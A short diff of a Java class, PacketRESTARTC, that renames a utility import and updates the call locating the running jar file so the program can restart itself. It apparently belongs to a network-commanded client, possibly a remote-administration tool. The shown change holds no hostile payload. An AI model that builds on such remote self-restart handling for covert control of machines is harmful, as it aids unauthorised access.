@@ -1,8 +1,8 @@
 package com.redpois0n.packets;
 
 import com.redpois0n.Connection;
-import com.redpois0n.Util;
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 public class PacketRESTARTC extends Packet {
 
@@ -15,7 +15,7 @@ public class PacketRESTARTC extends Packet {
 		}
 		String javapath = System.getProperty("java.home");
 		
-		String path = Util.getJarFile().getAbsolutePath();
+		String path = Utils.getJarFile().getAbsolutePath();
 		
 		if (path.startsWith("/") && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			path = path.substring(1, path.length());
